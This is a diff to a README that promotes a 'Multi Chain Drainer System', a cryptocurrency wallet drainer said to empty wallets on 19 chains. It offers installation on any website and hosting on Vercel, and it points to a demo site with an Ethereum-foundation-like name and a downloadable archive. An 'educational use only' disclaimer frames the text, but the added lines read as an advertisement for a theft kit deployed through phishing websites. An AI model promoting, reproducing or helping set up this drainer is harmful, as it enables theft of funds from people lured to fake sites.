@@ -1,6 +1,12 @@
 #########################################################################################################
 ** ‼️‼️‼️‼️ This files is dedicated to WEB3.0 and Legal Penetration Testing. All information on this files is for educational use only ‼️‼️‼️‼️**
 #########################################################################################################
+
+💯 Multi Chain Drainer System 💯
+
+Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
+Installation on any website files and documentation included 🔥
+
 Installation & Instructions on any WEBSITE 
 
 # STEP 1
@@ -38,6 +44,11 @@ It should look like this
 
 All is setup your drainer is ready to go. 
 Upload your website on Vercel or any Hosting
+
+
+WE PROVIDE A CUSTOM DEMO WEBSITE ALSO NAMED : newperfectdrainer2024.rar
+
+DEMO WEBSITE : https://ethfoundation.vercel.app/
 
 
 #########################################################################################################‼️
